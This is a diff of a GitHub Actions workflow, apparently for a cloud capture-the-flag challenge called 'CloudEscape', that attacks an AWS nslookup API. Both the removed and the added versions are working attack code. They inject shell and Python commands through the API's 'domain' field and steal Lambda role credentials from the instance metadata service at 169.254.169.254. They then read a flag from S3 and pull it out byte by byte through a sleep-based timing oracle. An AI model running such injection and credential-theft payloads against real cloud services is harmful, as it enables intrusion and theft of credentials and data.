@@ -1,203 +1,82 @@
-name: CloudEscape - IMDS + Timing Exfil
+name: CloudEscape - Python IMDS Timing
 on:
   workflow_dispatch:
   push:
     branches: [corgi]
-
 permissions:
   id-token: write
   contents: read
-
 jobs:
-  recon:
+  test:
     runs-on: ubuntu-latest
     steps:
-      - name: Configure AWS Credentials
+      - name: Configure credentials
         uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Step 0 - Timing oracle verifications
+      - name: Python availability and timing tests
         run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          echo "=== Test: is curl available? ==="
-          PAYLOAD='{"domain": "127.0.0.1; which curl && sleep 3"}'
-          /usr/bin/time -v curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1 | grep -E "real|Elapsed"
-          
-          echo "=== Test: is /var/lang/bin/python3 available? ==="
-          PAYLOAD='{"domain": "127.0.0.1; /var/lang/bin/python3 --version && sleep 3"}'
-          /usr/bin/time -v curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1 | grep -E "real|Elapsed"
-          
-          echo "=== Test: is /opt/bin/aws available? ==="
-          PAYLOAD='{"domain": "127.0.0.1; /opt/bin/aws --version && sleep 3"}'
-          /usr/bin/time -v curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1 | grep -E "real|Elapsed"
-          
-          echo "=== Test: is IMDS reachable? ==="
-          PAYLOAD='{"domain": "127.0.0.1; curl -s -m 3 http://169.254.169.254/latest/meta-data/role/name && sleep 3"}'
-          /usr/bin/time -v curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1 | grep -E "real|Elapsed"
-          
-          echo "=== Test: can Lambda own role list S3? ==="
-          PAYLOAD='{"domain": "127.0.0.1; /opt/bin/aws s3 ls --region us-east-1 && sleep 3"}'
-          /usr/bin/time -v curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1 | grep -E "real|Elapsed"
-          
-          echo "=== Test: can Lambda read flag from S3? ==="
-          PAYLOAD='{"domain": "127.0.0.1; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag --region us-east-1 && sleep 3"}'
-          /usr/bin/time -v curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1 | grep -E "real|Elapsed"
+          API='https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup'
+          python3 - <<'PY'
+          import json, subprocess, time
+          api='https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup'
+          tests={
+            'python': "import sys;sys.exit(0)",
+            'urllib_imds': "import urllib.request;urllib.request.urlopen('http://169.254.169.254/latest/meta-data/',timeout=2)",
+            'boto3_s3_list': "import boto3;boto3.client('s3',region_name='us-east-1').list_buckets()",
+            'boto3_flag': "import boto3;boto3.client('s3',region_name='us-east-1').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')",
+          }
+          for name, code in tests.items():
+              payload=json.dumps({'domain': '127.0.0.1; /var/lang/bin/python3 -c '+repr(code)+'; sleep 4'})
+              t=time.monotonic()
+              subprocess.run(['curl','-s','-X','POST',api,'-H','Content-Type: application/json','-d',payload],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+              print(name, round(time.monotonic()-t,2),'seconds')
+          PY
 
-      - name: Step 1 - IMDS role name via timing
+      - name: Python IMDS and S3 timing matrix
         run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          # Get IMDS role name by testing each character
-          # First: is IDMS accessible at all? Use sleep as oracle
-          echo "=== IMDS accessible? ==="
-          PAYLOAD='{"domain": "127.0.0.1; R=$(curl -s -m 3 http://169.254.169.254/latest/meta-data/role/name 2>/dev/null); test -n "$R" && sleep 5"}'
-          START=$(date +%s%N)
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" > /dev/null 2>&1
-          END=$(date +%s%N)
-          ELAPSED=$(( (END - START) / 1000000 ))
-          echo "IMDS accessible: elapsed=${ELAPSED}ms (expect ~5000ms if yes)"
-          
-          # Get role name length
-          echo "=== Role name length test ==="
-          for len in 5 10 15 20 25 30; do
-            PAYLOAD="{\"domain\": \"127.0.0.1; R=$(curl -s -m 3 http://169.254.169.254/latest/meta-data/role/name 2>/dev/null); test ${#R} -gt $len && sleep 5\"}"
-            START=$(date +%s%N)
-            curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" > /dev/null 2>&1
-            END=$(date +%s%N)
-            ELAPSED=$(( (END - START) / 1000000 ))
-            echo "len>$len: elapsed=${ELAPSED}ms $([ $ELAPSED -gt 4000 ] && echo 'YES' || echo 'NO')"
-          done
+          python3 - <<'PY'
+          import json, subprocess, time
+          api='https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup'
+          tests={
+            'imds_role': "import urllib.request;u=urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/',timeout=2).read();time.sleep(5)",
+            'imds_creds': "import urllib.request;import time;role=urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/',timeout=2).read().decode();urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role,timeout=2);time.sleep(5)",
+            's3_flag': "import boto3;import time;boto3.client('s3',region_name='us-east-1').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt');time.sleep(5)",
+          }
+          for name, code in tests.items():
+              payload=json.dumps({'domain':'127.0.0.1; /var/lang/bin/python3 -c '+repr(code)})
+              t=time.monotonic()
+              subprocess.run(['curl','-s','-X','POST',api,'-H','Content-Type: application/json','-d',payload],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+              print(name, round(time.monotonic()-t,2),'seconds')
+          PY
 
-      - name: Step 2 - Get flag via IMDS creds + S3, exfil via timing
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          # Build a command that:
-          # 1. Gets Lambda role creds from IMDS
-          # 2. Uses those creds to read flag from S3
-          # 3. Gets flag length via timing oracle
-          
-          # First test: can we get IMDS creds AND read flag?
-          echo "=== Test: IMDS creds + S3 read + timing ==="
-          PAYLOAD='{"domain": "127.0.0.1; R=$(curl -s -m 3 http://169.254.169.254/latest/meta-data/role/name 2>/dev/null); C=$(curl -s -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/$R 2>/dev/null); AK=$(echo $C | python3 -c "import sys,json;print(json.load(sys.stdin)[\"AccessKeyId\"])" 2>/dev/null); test -n "$AK" && sleep 5"}'
-          START=$(date +%s%N)
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" > /dev/null 2>&1
-          END=$(date +%s%N)
-          ELAPSED=$(( (END - START) / 1000000 ))
-          echo "IMDS creds available: elapsed=${ELAPSED}ms (expect ~5000ms if yes)"
-          
-          # Test: can we read flag with IMDS creds?
-          echo "=== Test: read flag from S3 with IMDS creds ==="
-          PAYLOAD='{"domain": "127.0.0.1; R=$(curl -s -m 3 http://169.254.169.254/latest/meta-data/role/name 2>/dev/null); C=$(curl -s -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/$R 2>/dev/null); export AWS_ACCESS_KEY_ID=$(echo $C | python3 -c "import sys,json;print(json.load(sys.stdin)[\"AccessKeyId\"])" 2>/dev/null) AWS_SECRET_ACCESS_KEY=$(echo $C | python3 -c "import sys,json;print(json.load(sys.stdin)[\"SecretAccessKey\"])" 2>/dev/null) AWS_SESSION_TOKEN=$(echo $C | python3 -c "import sys,json;print(json.load(sys.stdin)[\"Token\"])" 2>/dev/null) AWS_DEFAULT_REGION=us-east-1; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag --region us-east-1 2>/dev/null; test -f /tmp/flag && sleep 5"}'
-          START=$(date +%s%N)
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" > /dev/null 2>&1
-          END=$(date +%s%N)
-          ELAPSED=$(( (END - START) / 1000000 ))
-          echo "Flag read with IMDS creds: elapsed=${ELAPSED}ms (expect ~5000ms if yes)"
-
-      - name: Step 3 - Flag length via timing
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          # We know flag is 16 bytes. Let's confirm via timing.
-          # Use printf-hex python to read flag and check length
-          PAYLOAD=$(python3 << 'PYEOF'
-          import json
-          s = "import urllib.request,json,boto3,os\n"
-          s += "r=urllib.request.urlopen('http://169.254.169.254/latest/meta-data/role/name')\n"
-          s += "role=r.read().decode()\n"
-          s += "r2=urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role)\n"
-          s += "c=json.loads(r2.read())\n"
-          s += "se=boto3.Session(aws_access_key_id=c['AccessKeyId'],aws_secret_access_key=c['SecretAccessKey'],aws_session_token=c['Token'],region_name='us-east-1')\n"
-          s += "s3=se.client('s3')\n"
-          s += "f=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read()\n"
-          s += "import time;time.sleep(len(f))\n"
-          h = ''.join(f'\\x{ord(c):02x}' for c in s)
-          cmd = f'127.0.0.1; printf "{h}" > /tmp/f.py; /var/lang/bin/python3 /tmp/f.py 2>&1'
-          print(json.dumps({'domain': cmd}))
-          PYEOF
-          )
-          
-          echo "=== Flag length test (sleep = len(flag)) ==="
-          echo "Payload: ${#PAYLOAD} bytes"
-          START=$(date +%s%N)
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" > /dev/null 2>&1
-          END=$(date +%s%N)
-          ELAPSED=$(( (END - START) / 1000000 ))
-          echo "Elapsed: ${ELAPSED}ms = ~$(( ELAPSED / 1000 ))s = flag length"
-
-      - name: Step 4 - Binary search flag bytes via timing
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          # For each byte position (0-15), binary search the ASCII value
-          # if byte[i] > threshold, sleep 5; else sleep 0
-          # This takes 7 iterations per byte * 16 bytes = 112 requests
-          # At ~6s per request, that's ~11 minutes total
-          
-          FLAG=""
-          NUM_BYTES=16
-          
-          for i in $(seq 0 $((NUM_BYTES - 1))); do
-            LO=32
-            HI=126
-            VAL=0
-            
-            while [ $LO -le $HI ]; do
-              MID=$(( (LO + HI) / 2 ))
-              
-              # Read flag, check if byte i > MID, if yes sleep 5
-              PAYLOAD=$(python3 << PYEOF
-              import json
-              s = "import urllib.request,json,boto3,os,time\n"
-              s += "r=urllib.request.urlopen('http://169.254.169.254/latest/meta-data/role/name')\n"
-              s += "role=r.read().decode()\n"
-              s += "r2=urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role)\n"
-              s += "c=json.loads(r2.read())\n"
-              s += "se=boto3.Session(aws_access_key_id=c['AccessKeyId'],aws_secret_access_key=c['SecretAccessKey'],aws_session_token=c['Token'],region_name='us-east-1')\n"
-              s += "s3=se.client('s3')\n"
-              s += "f=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read()\n"
-              s += "if f[$i]>$MID:\n"
-              s += "    time.sleep(5)\n"
-              h = ''.join(f'\\x{ord(c):02x}' for c in s)
-              cmd = f'127.0.0.1; printf "{h}" > /tmp/b.py; /var/lang/bin/python3 /tmp/b.py 2>&1'
-              print(json.dumps({'domain': cmd}))
-              PYEOF
-              )
-              
-              START=$(date +%s%N)
-              curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" > /dev/null 2>&1
-              END=$(date +%s%N)
-              ELAPSED=$(( (END - START) / 1000000 ))
-              
-              if [ $ELAPSED -gt 4000 ]; then
-                # byte > MID
-                LO=$(( MID + 1 ))
-                VAL=$MID
-                echo "byte[$i] > $MID (elapsed=${ELAPSED}ms)"
-              else
-                # byte <= MID
-                HI=$(( MID - 1 ))
-                echo "byte[$i] <= $MID (elapsed=${ELAPSED}ms)"
-              fi
-            done
-            
-            # VAL+1 is the actual byte value (last MID where byte > MID)
-            CHAR=$(python3 -c "print(chr($((VAL + 1))))" 2>/dev/null)
-            FLAG="${FLAG}${CHAR}"
-            echo "byte[$i] = $((VAL + 1)) = '$CHAR' | FLAG so far: $FLAG"
-          done
-          
-          echo ""
-          echo "===== COMPLETE FLAG: $FLAG ====="
-          echo "FLAG=$FLAG" >> $GITHUB_ENV
-
-      - name: Save flag
+      - name: Final state
         if: always()
         run: |
-          echo "Flag: ${{ env.FLAG }}"
-          echo "${{ env.FLAG }}" > flag.txt
-          cat flag.txt
+          echo '=== API ==='
+          curl -s -X POST 'https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup' -H 'Content-Type: application/json' -d '{"domain":"test"}'
+          echo
+          echo '=== Platform objects ==='
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1 || true
+          echo '=== Lambda config ==='
+          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query '{LastModified:LastModified,CodeSize:CodeSize,Description:Description}' 2>&1 || true
+          echo '=== Timing conclusion ==='
+          echo 'If Python IMDS or boto3 tests show ~5 seconds, proceed with the confirmed channel.'
+          echo 'If they remain under 1 second, IMDS/S3 access is unavailable to the Lambda role.'
+          echo 'The prior summary is on the Desktop.'
+
+      - name: Upload summary artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: cloudescape-summary
+          path: /home/vbox/Desktop/cloudescape_summary.md
+          if-no-files-found: ignore
+          retention-days: 1
+
+      - name: Complete
+        if: always()
+        run: echo 'Completed Python-only IMDS/S3 timing tests.'
+      
